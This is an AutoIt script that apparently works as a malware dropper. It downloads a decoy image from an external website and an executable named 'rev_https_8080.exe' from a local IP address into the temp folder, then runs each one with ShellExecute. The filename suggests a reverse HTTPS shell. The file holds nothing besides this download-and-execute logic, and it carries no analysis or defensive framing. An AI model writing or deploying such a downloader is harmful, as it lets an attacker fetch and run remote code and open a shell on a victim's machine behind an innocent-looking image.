#include <StaticConstants.au3>
#include <WindowsConstants.au3>

Local $urls = "https://tocka.com.mk/images/gallery/gallery-images/big/1935/bfq3mezbmim-png-700-Zj747.jpg, http://192.168.1.10/files/rev_https_8080.exe"

Local $urlsArray = StringSplit($urls, ",", 2 )

For $url In $urlsArray
	$sFile = _DownloadFile($url)
	shellExecute($sFile)

Next

Func _DownloadFile($sURL)
    Local $hDownload, $sFile
    $sFile = StringRegExpReplace($sURL, "^.*/", "")
    $sDirectory = @TempDir & $sFile
    $hDownload = InetGet($sURL, $sDirectory, 17, 1)
    InetClose($hDownload)
    Return $sDirectory
EndFunc   ;==>_GetURLImage
